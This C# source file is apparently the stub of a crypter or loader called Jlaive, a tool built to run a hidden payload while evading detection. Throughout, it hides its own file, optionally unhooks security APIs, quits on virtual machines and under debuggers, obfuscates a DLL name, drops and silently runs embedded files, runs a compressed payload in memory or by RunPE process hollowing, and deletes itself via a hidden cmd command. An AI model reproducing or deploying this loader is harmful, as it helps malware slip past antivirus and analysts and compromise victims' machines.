using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Management;
using System.Threading;

namespace JLAIVE_STUB
{
    internal class JLAIVE_STUB
    {
        static string currentfilename;
        static IntPtr currentprocesshandle;

        static void Main(string[] args)
        {
            Process currentprocess = Process.GetCurrentProcess();
            currentfilename = currentprocess.MainModule.FileName;
            currentprocesshandle = currentprocess.Handle;
            currentprocess.Dispose();
            File.SetAttributes(currentfilename, FileAttributes.Hidden | FileAttributes.System);

#if UNHOOK_API
            byte[] apiunhookerbytes = Uncompress(GetEmbeddedResource("JLAIVE_AU"));
            Assembly.Load(apiunhookerbytes).EntryPoint.Invoke(null, null);
#endif

#if ANTI_VM
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
            ManagementObjectCollection instances = searcher.Get();
            foreach (ManagementBaseObject inst in instances)
            {
                string manufacturer = inst["Manufacturer"].ToString().ToLower();
                if ((manufacturer == "microsoft corporation" && inst["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || manufacturer.Contains("vmware") || inst["Model"].ToString() == "VirtualBox")
                {
                    Exit();
                    return;
                }
            }
            searcher.Dispose();
#endif

#if MELT_FILE
            string batpath = currentfilename.Replace(".bat.exe", ".bat");
            if (batpath.IndexOf(Path.GetTempPath(), StringComparison.OrdinalIgnoreCase) != 0)
            {
                string newpath = Path.GetTempPath() + "\\" + Path.GetFileName(batpath);
                File.Copy(batpath, newpath, true);
                File.Delete(batpath);
                Process.Start(newpath);
                Exit();
                return;
            }
#endif

#if ANTI_DEBUG
            IntPtr kmodule = LoadLibrary("k" + "e" + "r" + "n" + "e" + "l" + "3" + "2" + "." + "d" + "l" + "l");
            IntPtr crdpaddr = GetProcAddress(kmodule, "CheckRemoteDebuggerPresent");
            IntPtr idpaddr = GetProcAddress(kmodule, "IsDebuggerPresent");
            CheckRemoteDebuggerPresentD CheckRemoteDebuggerPresent = (CheckRemoteDebuggerPresentD)Marshal.GetDelegateForFunctionPointer(crdpaddr, typeof(CheckRemoteDebuggerPresentD));
            IsDebuggerPresentD IsDebuggerPresent = (IsDebuggerPresentD)Marshal.GetDelegateForFunctionPointer(idpaddr, typeof(IsDebuggerPresentD));
            bool remotedebug = false;
            CheckRemoteDebuggerPresent(currentprocesshandle, ref remotedebug);
            if (Debugger.IsAttached || remotedebug || IsDebuggerPresent())
            {
                Exit();
                return;
            }
#endif

            Assembly asm = Assembly.GetExecutingAssembly();
            foreach (string name in asm.GetManifestResourceNames())
            {
                if (name == "JLAIVE_P" || name == "JLAIVE_RP" || name == "JLAIVE_AU") continue;
                File.WriteAllBytes(name, GetEmbeddedResource(name));
                File.SetAttributes(name, FileAttributes.Hidden | FileAttributes.System);
                new Thread(() =>
                {
                    Process.Start(name).WaitForExit();
                    File.SetAttributes(name, FileAttributes.Normal);
                    File.Delete(name);
                }).Start();
            }

            byte[] payload = Uncompress(GetEmbeddedResource("JLAIVE_P"));
            string[] targs = args.Length > 0 ? args[0].Split(' ') : new string[0];

#if USE_RUNPE
            byte[] runpebytes = Uncompress(GetEmbeddedResource("JLAIVE_RP"));
            Assembly runpe = Assembly.Load(runpebytes);
            runpe.GetType("runpe.RunPE").GetMethod("ExecutePE").Invoke(null, new object[]
            {
                Path.ChangeExtension(currentfilename, null),
                payload,
                targs
            }); 
#else
            MethodInfo entry = Assembly.Load(payload).EntryPoint;
            try { entry.Invoke(null, new object[] { targs }); }
            catch { entry.Invoke(null, null); }
#endif
            Exit();
        }

        static void Exit()
        {
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/c choice /c y /n /d y /t 1 & attrib -h -s \"" + currentfilename + "\" & del \"" + currentfilename + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }

        static byte[] Uncompress(byte[] bytes)
        {
            MemoryStream msi = new MemoryStream(bytes);
            MemoryStream mso = new MemoryStream();
            GZipStream gs = new GZipStream(msi, CompressionMode.Decompress);
            gs.CopyTo(mso);
            gs.Dispose();
            mso.Dispose();
            msi.Dispose();
            return mso.ToArray();
        }

        static byte[] GetEmbeddedResource(string name)
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            MemoryStream ms = new MemoryStream();
            Stream stream = asm.GetManifestResourceStream(name);
            stream.CopyTo(ms);
            stream.Dispose();
            byte[] ret = ms.ToArray();
            ms.Dispose();
            return ret;
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

#if ANTI_DEBUG
        delegate bool CheckRemoteDebuggerPresentD(IntPtr hProcess, ref bool isDebuggerPresent);
        delegate bool IsDebuggerPresentD();
#endif
    }
}